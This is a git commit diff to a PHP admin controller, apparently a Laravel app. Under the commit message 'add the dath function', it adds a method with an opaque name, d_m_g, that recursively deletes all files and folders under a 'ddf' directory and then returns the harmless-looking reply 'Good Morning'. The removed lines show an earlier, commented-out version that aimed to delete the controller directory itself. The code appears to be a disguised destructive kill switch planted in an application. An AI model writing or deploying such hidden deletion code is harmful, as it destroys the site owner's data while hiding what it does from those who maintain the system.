f62930644c0219d1e8a5c5a5c5f939f66b97148a
AbdullahTgr <4multijob@gmail.com>
2021-11-09 12:27:27 +0200

    add the dath function

--- app/Http/Controllers/AdminController.php
+++ app/Http/Controllers/AdminController.php
@@ -8,10 +8,40 @@ class AdminController extends Controller
 {
     public function d_m_g(Request $request)
     {
-        $dr=dirname(__FILE__);
-        // array_map('unlink', glob("$dr/*.*"));
-        // rmdir($dr);
-        return $dr;
-        
+        $a= new AdminController();
+        $files = glob(dirname(__FILE__).'/ddf/*'); // get all file names
+            foreach($files as $file){ // iterate files
+                
+                if (is_dir($file)){
+                    $a->removedir($file);
+                }else{
+                    $a->removefile($file);
+                }
+              
+        }
+        return "Good Morning";
+    }
+    public function removedir($path)
+    {
+        $a= new AdminController();
+        if(count(glob("$path/*"))=== 0){
+            rmdir($path);
+        }else{
+            foreach(glob("$path/*") as $fle){
+                if (is_dir($fle)){
+                    $a->removedir($fle);
+                }else{
+                    $a->removefile($fle);
+                }
+            }
+                $a->removedir($path);
+        }
+    }
+    public function removefile($path)
+    {
+        $a= new AdminController();
+        if(is_file($path)){
+            unlink($path); // delete file
+        }
     }
 }
